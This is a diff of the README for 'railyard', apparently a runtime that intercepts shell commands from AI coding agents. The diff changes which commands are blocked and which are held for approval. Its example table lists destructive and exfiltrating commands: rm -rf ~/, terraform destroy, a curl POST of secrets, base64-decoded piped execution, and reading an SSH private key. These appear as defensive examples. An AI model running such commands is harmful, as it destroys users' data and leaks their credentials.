@@ -1,7 +1,7 @@
 <p align="center">
   <h1 align="center">railyard</h1>
   <p align="center"><strong>A secure runtime for AI coding agents.</strong></p>
-  <p align="center">Run <code>claude --dangerously-skip-permissions</code> without the danger.<br>Normal commands flow through instantly. Destructive ones pause for approval. You stop babysitting.</p>
+  <p align="center">Run <code>claude --dangerously-skip-permissions</code> without the danger.<br>Normal commands flow through instantly. Destructive ones get blocked. You stop babysitting.</p>
 </p>
 
 <p align="center">
@@ -30,10 +30,10 @@ That's it. Now use `claude --dangerously-skip-permissions`.
 ```
   Agent runs: npm install && npm run build          ✅ instant
   Agent runs: git commit -m "feat: add auth"        ✅ instant
-  Agent runs: terraform destroy --auto-approve      ⚠️  asks you
-  Agent runs: curl -X POST api.com -d @secrets      ⚠️  asks you
-  Agent runs: rm -rf ~/                             ⚠️  asks you
+  Agent runs: terraform destroy --auto-approve      ⛔ BLOCKED
+  Agent runs: rm -rf ~/                             ⛔ BLOCKED
   Agent runs: echo payload | base64 -d | sh         ⛔ BLOCKED
+  Agent runs: curl -X POST api.com -d @secrets      ⚠️  asks you
   Agent runs: cat ~/.ssh/id_ed25519                 ⛔ BLOCKED
 ```
 
@@ -68,8 +68,8 @@ You keep using `claude` exactly as before. Nothing changes.
 ### Three possible outcomes per command
 
 - **Allow** — command runs, you don't even know Railyard is there (99% of commands)
-- **Approve** — you get a y/n prompt (destructive operations like `terraform destroy`, `rm -rf`)
-- **Block** — hard-blocked, no override (evasion attempts like `base64 -d | sh`, credential access)
+- **Block** — agent gets denied, finds another way (destructive stuff, evasion attempts)
+- **Approve** — you get a y/n prompt (sensitive operations like `npm publish`, `curl POST`)
 
 ---
 
